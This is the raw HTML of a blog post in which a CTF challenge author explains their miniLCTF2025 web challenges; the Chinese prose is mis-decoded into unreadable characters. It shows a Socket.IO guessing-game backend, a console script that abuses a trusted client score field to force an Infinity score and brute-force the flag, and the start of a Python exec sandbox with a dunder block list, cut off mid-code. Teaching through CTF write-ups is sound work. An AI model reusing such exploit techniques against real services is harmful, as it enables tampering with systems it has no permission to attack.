<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>miniLCTF2025-Web/Miscå‡ºé¢˜ä¸WP - xt&#039;s blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="xt&#039;s blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="xt&#039;s blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="å‡ºäº†3é“é¢˜ï¼Œæœ¬æ¥PyJailçš„åŸå‹æ˜¯PyBox Revengeï¼Œä½†æ˜¯Webé¢˜å¤šäº†ï¼ŒMiscé¢˜ä¸å¤ªå¤Ÿå°±æ”¹æˆPyJailæ”¾Miscäº†ï¼ˆé¢å‡ºå‡ºæ¥è‡ªå·±æ‰“äº†ä¸€ä¸‹åˆï¼‰ GuessOneGuess-Webç­¾åˆ°é¢˜ åç«¯å…³é”®ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515"><meta property="og:type" content="blog"><meta property="og:title" content="miniLCTF2025-Web/Miscå‡ºé¢˜ä¸WP"><meta property="og:url" content="https://www.xiaotian.org.cn/2025/05/05/miniLCTF2025-WebMisc%E5%87%BA%E9%A2%98%E4%B8%8EWP/"><meta property="og:site_name" content="xt&#039;s blog"><meta property="og:description" content="å‡ºäº†3é“é¢˜ï¼Œæœ¬æ¥PyJailçš„åŸå‹æ˜¯PyBox Revengeï¼Œä½†æ˜¯Webé¢˜å¤šäº†ï¼ŒMiscé¢˜ä¸å¤ªå¤Ÿå°±æ”¹æˆPyJailæ”¾Miscäº†ï¼ˆé¢å‡ºå‡ºæ¥è‡ªå·±æ‰“äº†ä¸€ä¸‹åˆï¼‰ GuessOneGuess-Webç­¾åˆ°é¢˜ åç«¯å…³é”®ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.xiaotian.org.cn/img/og_image.png"><meta property="article:published_time" content="2025-05-05T08:58:47.000Z"><meta property="article:modified_time" content="2025-05-09T07:43:26.688Z"><meta property="article:author" content="xiaotian"><meta property="article:tag" content="xt,blog,ä¸ªäººåšå®¢,ç”Ÿæ´»,å­¦ä¹ ,å·¥ä½œ"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://www.xiaotian.org.cn/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.xiaotian.org.cn/2025/05/05/miniLCTF2025-WebMisc%E5%87%BA%E9%A2%98%E4%B8%8EWP/"},"headline":"miniLCTF2025-Web/Miscå‡ºé¢˜ä¸WP","image":["https://www.xiaotian.org.cn/img/og_image.png"],"datePublished":"2025-05-05T08:58:47.000Z","dateModified":"2025-05-09T07:43:26.688Z","author":{"@type":"Person","name":"xiaotian"},"publisher":{"@type":"Organization","name":"xt's blog","logo":{"@type":"ImageObject","url":"https://www.xiaotian.org.cn/img/logo.svg"}},"description":"å‡ºäº†3é“é¢˜ï¼Œæœ¬æ¥PyJailçš„åŸå‹æ˜¯PyBox Revengeï¼Œä½†æ˜¯Webé¢˜å¤šäº†ï¼ŒMiscé¢˜ä¸å¤ªå¤Ÿå°±æ”¹æˆPyJailæ”¾Miscäº†ï¼ˆé¢å‡ºå‡ºæ¥è‡ªå·±æ‰“äº†ä¸€ä¸‹åˆï¼‰ GuessOneGuess-Webç­¾åˆ°é¢˜ åç«¯å…³é”®ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515"}</script><link rel="canonical" href="https://www.xiaotian.org.cn/2025/05/05/miniLCTF2025-WebMisc%E5%87%BA%E9%A2%98%E4%B8%8EWP/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/6.0.0/css/all.min.css"><link data-pjax rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/11.7.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdnjs.loli.net/ajax/libs/pace/1.2.4/pace.min.js"></script><!--!--><!--!--><script data-ad-client="ca-pub-2272009624021828" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="xt&#039;s blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/xiaotian2023"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="ç›®å½•" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="æœç´¢" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-05-05T08:58:47.000Z" title="2025/5/5 16:58:47">2025-05-05</time>å‘è¡¨</span><span class="level-item"><time dateTime="2025-05-09T07:43:26.688Z" title="2025/5/9 15:43:26">2025-05-09</time>æ›´æ–°</span><span class="level-item"><a class="link-muted" href="/categories/%E6%8A%80%E6%9C%AF/">æŠ€æœ¯</a><span>Â /Â </span><a class="link-muted" href="/categories/%E6%8A%80%E6%9C%AF/ctf/">ctf</a><span>Â /Â </span><a class="link-muted" href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/">web</a></span><span class="level-item">17 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦2539ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile">miniLCTF2025-Web/Miscå‡ºé¢˜ä¸WP</h1><div class="content"><p>å‡ºäº†3é“é¢˜ï¼Œæœ¬æ¥PyJailçš„åŸå‹æ˜¯PyBox Revengeï¼Œä½†æ˜¯Webé¢˜å¤šäº†ï¼ŒMiscé¢˜ä¸å¤ªå¤Ÿå°±æ”¹æˆPyJailæ”¾Miscäº†ï¼ˆé¢å‡ºå‡ºæ¥è‡ªå·±æ‰“äº†ä¸€ä¸‹åˆï¼‰</p>
<h2 id="GuessOneGuess-Web"><a href="#GuessOneGuess-Web" class="headerlink" title="GuessOneGuess-Web"></a>GuessOneGuess-Web</h2><p>ç­¾åˆ°é¢˜</p>
<p>åç«¯å…³é”®ä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">io</span>) &#123;</span><br><span class="line">    io.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">socket</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> targetNumber = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">let</span> guessCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> totalScore = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">FLAG</span> = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&quot;miniL&#123;THIS_IS_THE_FLAG&#125;&quot;</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`æ–°è¿æ¥ - ç›®æ ‡æ•°å­—: <span class="subst">$&#123;targetNumber&#125;</span>`</span>);</span><br><span class="line">        </span><br><span class="line">        socket.<span class="title function_">emit</span>(<span class="string">&#x27;game-message&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;welcome&#x27;</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;çŒœä¸€ä¸ª1-100ä¹‹é—´çš„æ•°å­—ï¼&#x27;</span>,</span><br><span class="line">            <span class="attr">score</span>: totalScore</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        socket.<span class="title function_">on</span>(<span class="string">&#x27;guess&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(totalScore);</span><br><span class="line">                <span class="keyword">const</span> guess = <span class="built_in">parseInt</span>(data.<span class="property">value</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">isNaN</span>(guess)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;è¯·è¾“å…¥æœ‰æ•ˆæ•°å­—&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (guess &lt; <span class="number">1</span> || guess &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;è¯·è¾“å…¥1-100ä¹‹é—´çš„æ•°å­—&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                guessCount++;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (guess === targetNumber) &#123;</span><br><span class="line">                    <span class="keyword">const</span> currentScore = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">100</span> / <span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">2</span>, guessCount - <span class="number">1</span>));</span><br><span class="line">                    totalScore += currentScore;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">let</span> message = <span class="string">`ğŸ‰ çŒœå¯¹äº†ï¼å¾—åˆ† +<span class="subst">$&#123;currentScore&#125;</span> (æ€»åˆ†æ•°: <span class="subst">$&#123;totalScore&#125;</span>)`</span>;</span><br><span class="line">                    <span class="keyword">let</span> showFlag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (totalScore &gt; <span class="number">1.7976931348623157e308</span>) &#123;</span><br><span class="line">                        message += <span class="string">`\nğŸ´ <span class="subst">$&#123;FLAG&#125;</span>`</span>;</span><br><span class="line">                        showFlag = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    socket.<span class="title function_">emit</span>(<span class="string">&#x27;game-message&#x27;</span>, &#123;</span><br><span class="line">                        <span class="attr">type</span>: <span class="string">&#x27;result&#x27;</span>,</span><br><span class="line">                        <span class="attr">win</span>: <span class="literal">true</span>,</span><br><span class="line">                        <span class="attr">message</span>: message,</span><br><span class="line">                        <span class="attr">score</span>: totalScore,</span><br><span class="line">                        <span class="attr">showFlag</span>: showFlag,</span><br><span class="line">                        <span class="attr">currentScore</span>: currentScore</span><br><span class="line">                    &#125;);</span><br><span class="line">                    </span><br><span class="line">                    targetNumber = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`æ–°ç›®æ ‡æ•°å­—: <span class="subst">$&#123;targetNumber&#125;</span>`</span>);</span><br><span class="line">                    guessCount = <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (guessCount &gt;= <span class="number">100</span>) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;100æ¬¡æœªçŒœä¸­ï¼å°†æ‰£é™¤å½“å‰åˆ†æ•°å¹¶é‡ç½®&quot;</span>);</span><br><span class="line">                        socket.<span class="title function_">emit</span>(<span class="string">&#x27;punishment&#x27;</span>, &#123;</span><br><span class="line">                            <span class="attr">message</span>: <span class="string">&quot;100æ¬¡æœªçŒœä¸­ï¼å°†æ‰£é™¤å½“å‰åˆ†æ•°å¹¶é‡ç½®&quot;</span>,</span><br><span class="line">                        &#125;);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    socket.<span class="title function_">emit</span>(<span class="string">&#x27;game-message&#x27;</span>, &#123;</span><br><span class="line">                        <span class="attr">type</span>: <span class="string">&#x27;result&#x27;</span>,</span><br><span class="line">                        <span class="attr">win</span>: <span class="literal">false</span>,</span><br><span class="line">                        <span class="attr">message</span>: guess &lt; targetNumber ? <span class="string">&#x27;å¤ªå°äº†ï¼&#x27;</span> : <span class="string">&#x27;å¤ªå¤§äº†ï¼&#x27;</span>,</span><br><span class="line">                        <span class="attr">score</span>: totalScore</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                socket.<span class="title function_">emit</span>(<span class="string">&#x27;game-message&#x27;</span>, &#123;</span><br><span class="line">                    <span class="attr">type</span>: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                    <span class="attr">message</span>: err.<span class="property">message</span>,</span><br><span class="line">                    <span class="attr">score</span>: totalScore</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        socket.<span class="title function_">on</span>(<span class="string">&#x27;punishment-response&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">score</span>);</span><br><span class="line">          totalScore -= data.<span class="property">score</span>;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(totalScore);</span><br><span class="line">          guessCount = <span class="number">0</span>;</span><br><span class="line">          targetNumber = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`æ–°ç›®æ ‡æ•°å­—: <span class="subst">$&#123;targetNumber&#125;</span>`</span>);</span><br><span class="line">          socket.<span class="title function_">emit</span>(<span class="string">&#x27;game-message&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;result&#x27;</span>,</span><br><span class="line">            <span class="attr">win</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;æ‰£é™¤åˆ†æ•°å¹¶é‡ç½®&quot;</span>,</span><br><span class="line">            <span class="attr">score</span>: totalScore,</span><br><span class="line">            <span class="attr">showFlag</span>: <span class="literal">false</span>,</span><br><span class="line">          &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>åˆ†æ•°è¦å¤§äº<code>1.7976931348623157e308</code>æ‰ä¼šç»™flagè¿™ä¸ªæ•°æ°æ°æ˜¯jsä¸­<code>Number.MAX_VALUE</code>ï¼Œä½†æ˜¯å¦‚æœè¶…è¿‡è¿™ä¸ªå€¼å°±ä¼šå˜æˆ<code>Infinity</code>ï¼Œåªæœ‰<code>Infinity&gt;Number.MAX_VALUE</code>æ‰æ˜¯<code>true</code>ï¼Œ</p>
<p>åç«¯ç›‘å¬çš„<code>&#39;punishment-response&#39;</code>æ‰§è¡Œ<code>totalScore -= data.score;</code>ï¼Œè€Œdataæ˜¯å‰ç«¯å¯æ§çš„ï¼Œ</p>
<p>ä½†æ˜¯ç›´æ¥<code>socket.emit(&#39;punishment-response&#39;, &#123;  score: -1.8e308 &#125;);</code>åªè¦è¿™ä¸ªæ•°å¤§äº<code>Number.MAX_VALUE</code>ï¼ˆæˆ‘ä»¬è¿™é‡Œç§°ä¸º<code>Infinity</code>ï¼‰,å®é™…å°±æ˜¯<code>socket.emit(&#39;punishment-response&#39;, &#123;  score: -Infinity &#125;);</code>ä¼šå¤±è´¥ï¼ŒåŸå› æ˜¯</p>
<p>Socket.IO åœ¨ä¼ è¾“æ•°æ®æ—¶ä½¿ç”¨çš„æ˜¯ JSON åºåˆ—åŒ–ã€‚å¦‚æœå€¼æ˜¯ <code>Infinity</code>ã€<code>-Infinity</code> æˆ– <code>NaN</code>ï¼Œè¿™äº›æ˜¯ <strong>ä¸èƒ½è¢« JSON è¡¨ç¤ºçš„</strong>ï¼Œä¼šè¢«åºåˆ—åŒ–æˆ <code>null</code></p>
<p><code>JSON.stringify(&#123; score: -Infinity &#125;); // &#39;&#123;&quot;score&quot;:null&#125;&#39;</code>æ‰€ä»¥å¾—è®©Socket.IOä¼ è¾“çš„æ—¶å€™æ­£å¸¸ä¼ ï¼ˆä¸è¢«åºåˆ—åŒ–ä¸ºæ— æ•ˆå€¼ï¼‰</p>
<p>è¿™é‡Œçš„è§£å†³åŠæ³•æ˜¯<code>&#123;  score: &quot;-Infinity&quot; &#125;</code>ï¼ˆå­—ç¬¦ä¸²ï¼‰æˆ–è€…å‘<code>-1e308</code>ï¼ˆå°äº<code>Number.MAX_VALUE</code>ï¼‰å¤šå‘å‡ æ¬¡åç«¯ä¸€è¿ç®—è¿˜æ˜¯<code>Infinity</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">socket = <span class="title function_">io</span>();</span><br><span class="line"><span class="comment">//socket.emit(&#x27;punishment-response&#x27;, &#123;</span></span><br><span class="line"><span class="comment">//  score: &quot;-Infinity&quot;</span></span><br><span class="line"><span class="comment">//&#125;);æˆ–è€…ä¸‹é¢çš„</span></span><br><span class="line">socket.<span class="title function_">emit</span>(<span class="string">&#x27;punishment-response&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">score</span>: -<span class="number">1e308</span></span><br><span class="line">&#125;);</span><br><span class="line">socket.<span class="title function_">emit</span>(<span class="string">&#x27;punishment-response&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">score</span>: -<span class="number">1e308</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//çŒœå¯¹è¿™é‡Œå¯äºŒåˆ†æ³•çŒœ,æ‰‹è¯•äºŒåˆ†æ³•ä¹Ÿok,å…¶å®forå¾ªç¯çˆ†ä¹Ÿå‹</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line"> socket.<span class="title function_">emit</span>(<span class="string">&#x27;guess&#x27;</span>, &#123;</span><br><span class="line">   <span class="attr">value</span>: i</span><br><span class="line"> &#125;);</span><br><span class="line"> socket.<span class="title function_">on</span>(</span><br><span class="line">   <span class="string">&#x27;game-message&#x27;</span>,</span><br><span class="line">   <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">message</span>);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure>

<p>å¡æ§åˆ¶å°è¿è¡Œ</p>
<p>è¿™é¢˜çš„å…³é”®è¿˜æ˜¯<code>Socket.IO</code>ä¼ è¾“å°†<code>-Infinity</code>ç³»åˆ—åŒ–ä¸º<code>null</code>ï¼Œå¯èƒ½ä¼šæœ‰äººå¡åœ¨è¿™æ‡µé€¼</p>
<h2 id="PyBox-Web"><a href="#PyBox-Web" class="headerlink" title="PyBox-Web"></a>PyBox-Web</h2><p>è¿›å»ç›´æ¥ç»™æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SandboxVisitor</span>(ast.NodeVisitor):</span><br><span class="line">    forbidden_attrs = &#123;</span><br><span class="line">        <span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__dict__&quot;</span>, <span class="string">&quot;__bases__&quot;</span>, <span class="string">&quot;__mro__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;__code__&quot;</span>, <span class="string">&quot;__closure__&quot;</span>, <span class="string">&quot;__func__&quot;</span>, <span class="string">&quot;__self__&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__module__&quot;</span>, <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;__builtins__&quot;</span>, <span class="string">&quot;__base__&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_Attribute</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.attr, <span class="built_in">str</span>) <span class="keyword">and</span> node.attr <span class="keyword">in</span> <span class="variable language_">self</span>.forbidden_attrs:</span><br><span class="line">            <span class="keyword">raise</span> ValueError</span><br><span class="line">        <span class="variable language_">self</span>.generic_visit(node)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_GeneratorExp</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_executor</span>(<span class="params">code, result_queue</span>):</span><br><span class="line">    safe_builtins = &#123;</span><br><span class="line">        <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>,</span><br><span class="line">        <span class="string">&quot;filter&quot;</span>: <span class="built_in">filter</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span>: <span class="built_in">list</span>,</span><br><span class="line">        <span class="string">&quot;len&quot;</span>: <span class="built_in">len</span>,</span><br><span class="line">        <span class="string">&quot;addaudithook&quot;</span>: sys.addaudithook,</span><br><span class="line">        <span class="string">&quot;Exception&quot;</span>: Exception</span><br><span class="line">    &#125;</span><br><span class="line">    safe_globals = &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;</span><br><span class="line"></span><br><span class="line">    sys.stdout = io.StringIO()</span><br><span class="line">    sys.stderr = io.StringIO()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(code, safe_globals)</span><br><span class="line">        output = sys.stdout.getvalue()</span><br><span class="line">        error = sys.stderr.getvalue()</span><br><span class="line">        result_queue.put((<span class="string">&quot;ok&quot;</span>, output <span class="keyword">or</span> error))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        result_queue.put((<span class="string">&quot;err&quot;</span>, <span class="built_in">str</span>(e)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_exec</span>(<span class="params">code: <span class="built_in">str</span>, timeout=<span class="number">1</span></span>):</span><br><span class="line">    code = code.encode().decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">    tree = ast.parse(code)</span><br><span class="line">    SandboxVisitor().visit(tree)</span><br><span 